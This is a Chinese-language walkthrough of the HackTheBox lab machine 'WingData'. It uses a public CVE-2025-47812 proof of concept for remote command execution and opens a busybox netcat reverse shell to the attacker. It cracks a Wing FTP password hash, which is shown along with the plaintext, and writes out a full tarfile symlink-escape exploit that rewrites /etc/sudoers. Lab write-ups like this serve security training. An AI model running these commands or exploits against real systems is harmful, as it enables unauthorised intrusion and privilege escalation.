---
title: HackTheBox Season 10  WingData 难度:Easy
url: https://mp.weixin.qq.com/s/f4Y422HIqutia5ifSnUs7A
source: Doonsec's feed
date: 2026-02-16
fetch_date: 2026-02-17T04:16:51.346386
---

# HackTheBox Season 10  WingData 难度:Easy

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/cGhMn4Bj3banXdq6m5FENoR6MW9ZcHjCtTVBdhZr0ZWW4JLZNs7ZLjUVh5D90EZ45XAftubBgu19wagnJsPmicU33CN5PHTeZsOicHIFjqLF4/0?wx_fmt=jpeg)

# HackTheBox Season 10 WingData 难度:Easy

原创

信益安研究院
信益安研究院

信益安信息安全研究院

![]()

在小说阅读器中沉浸阅读

# WingData

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYnTyiaOxxuZffk9vZMoovcdYniaAyzH9RmYJpH1hzV4plFEticU65HoroznGMotIXBYtQY8YicFOjiaHGgs9SIWgwJa7Mhf6X3ueys/640?wx_fmt=png&from=appmsg "null")

## nmap：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYyveQUzZ7c4AfAHeiaw5ibjDl9icARAZBNDNH32RlXf0ibxfuscgbx7MiaDKsBAibfbibQfvC0Bica1dktt2Sw5OvE2o3QO2xHePrwRvg/640?wx_fmt=png&from=appmsg "null")

### 添加进hosts文件访问：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3ba1d1icehqnOOXcJyzAVvJnIVlwR3XkiazLmm2lU5l2LmEr4Jjr1G2P0zya3OmiafzhO3xQfF3z1tzn17rAfUUMehvDuA44HYTAY4/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bbtCIPKtplEbqQBXEYLKgoicnCoGgBBVyaaia0NW6sAnRVLI4wJbVW7bd5MF5X9wuSRXa9ZsFM5cibYvj8wwbvAmKQ1eW4P0rZ44U/640?wx_fmt=png&from=appmsg "null")

### 再把这个域名也添加访问:

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZialxkNgo6WicoYsBNicSRlWhrrD3SKmCTQFMcxwY6905ynCicj3jl53TUx59PISbtbibyhWOnOl9X2fcWxXWewhibM1iahC59GjYHiaQ/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bb6vVjSw6lKLKIKyXXpxS1FMibtc8sTMGWxia77wWtTA436NsNjnMGkHg4icGBQyjEzs60JD229RcUB0ZrgB6eriaHLia3aiah1s9mus/640?wx_fmt=png&from=appmsg "null")

## 通过版本找到了cve（CVE-2025-47812）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bbRhsnPUnAVLVAvoB3fXia8ujWPdUIu2vibA59KV6IibEKalhB1cicI9icKaibzuUzjfISypp2DsFNQML3qnibtczPEGAdf87ogRibkSCA/640?wx_fmt=png&from=appmsg "null")

### 脚本直接打：

```
//https://github.com/4m3rr0r/CVE-2025-47812-poc/blob/main/CVE-2025-47812.py
python3 47812.py -u http://ftp.wingdata.htb -c 'whoami' -v
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbCicSwUcqKN0FQozm9oPhicicAYFcpEQjeicVAhQZkvmVKvNEDtvogF2jvcCItnN1ZSDYYx6OFIdZnk1V5sCHT04J7TNgewgtCHxc/640?wx_fmt=png&from=appmsg "null")

### 反弹shell：

```
python3 47812.py -u http://ftp.wingdata.htb -c 'busybox nc 10.10.xx.xx 8888 -e sh' -v
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bbybb9U5LN6gAHTibfSSWGYyicQuDgWdce0bEqwRUBG6Hbo8HmPhwdNujxSj4PPlRuicSvEajmEDjHkoGLHAfeE3J8MRdAwuXr6Vg/640?wx_fmt=png&from=appmsg)

#### 拿到shell后在Wing FTP安装目录下发现了用户加密凭据：

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZnibet9AUZIVkiaxVQMnr34j2lYBGfjPNia9iakicnmMzeiaD4xTr1HhVX3CV3qJZX5vQN5oH0tSj17ndTrSiciada0KibqobeFCCL8Too/640?wx_fmt=png&from=appmsg "null")

#### 爆破hash（Wing FTP 使用SHA256算法，并使用盐值“WingFTP”为加密方式。）：

```
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
//   wacky/!#7Blushing^*Bride5
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3baZ9bcIWQguYETHcHibTUlsicOiczbJBm7Rn38FHlriaKqdLof9Po4ECgu3ndm3SPmqD1XXOqwZlVSOA8lhVUvxdqv1ypxX1fyaEbw/640?wx_fmt=png&from=appmsg "null")

### ssh上去成功拿到user的flag：

```
ssh wacky@10.129.3.155
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbSibkwskLfp5xtDpF3DgtoXaic3WX3C1HJ7AnxASaDyw5FnzSjTicbZcrcEMAIicZP3dLuMBPwgWiaOWmNctRk6MRib04TicYFgPqmYk/640?wx_fmt=png&from=appmsg "null")

## 提权：

### 看下sudo权限发现有个脚本：

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZUFdibXg7sEO9dTJlVHuchQKrtzicmnd6xO7RLBH5kkCB86Zpic0zt7V4jLricQnHOk5rYl4RTqZzICMvncGoEAo24z22dicNBHGdQ/640?wx_fmt=png&from=appmsg "null")

### 看一下这个脚本：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3barEfBo5dTmqrCgaaFo19tX4yx2K4CtNIKfdIJeC1OrC2GLibiak9f6jEt78ExCAfZcmjjbrRczXEUJ4paF7Ebv1ZDWiclQFJProU/640?wx_fmt=png&from=appmsg "null")

#### 脚本内容：

```
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3baTOsL4IqnKOiaGAo4JiauewiaRQP80gibr7FdHnwsxdt1lAGlQL8iaaXbNhMyVyicznPKhF6GUNYuuzM5DwgvBsicoWSHF8UAYVSJjC0/640?wx_fmt=png&from=appmsg "null")

### 我们用这个脚本来利用：

```
cat > exploit.py << 'EOF'
import tarfile
import os
import io
import sys
comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)
    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
print("[+] Exploit created")
EOF
```

#### 先利用脚本生成一个tar文件

```
python3 exploit_cve.py
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZ0ws3nubCXnEAWiaUibIn116QZu5zly6icSR7TiclRTr3GrGjqzA3DG16tVib7GHd6gdxticD1e...